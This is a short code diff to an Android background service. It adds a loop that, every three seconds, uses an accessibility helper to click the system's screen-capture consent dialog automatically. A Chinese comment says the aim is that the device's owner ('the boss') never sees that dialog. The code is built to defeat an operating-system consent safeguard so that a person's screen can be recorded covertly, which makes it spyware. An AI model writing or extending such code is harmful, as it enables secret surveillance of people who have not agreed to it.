@@ -39,6 +39,15 @@ public class KeeperService extends Service {
             } catch (Throwable t) {
                 Log.w(TAG, "check failed", t);
             }
+            // 投屏授权框的兜底点击：无障碍事件偶尔会漏（弹窗是 systemui 的，
+            // 某些 ROM 不派发窗口变化事件），这里 3 秒一轮补点，老板全程看不到这个框。
+            try {
+                if (ScreenCapture.awaitingConsent()) {
+                    Consent.clickIfNeeded(Remote.service());
+                }
+            } catch (Throwable t) {
+                Log.w(TAG, "consent autopick failed", t);
+            }
             if (running) worker.postDelayed(this, INTERVAL_MS);
         }
     };
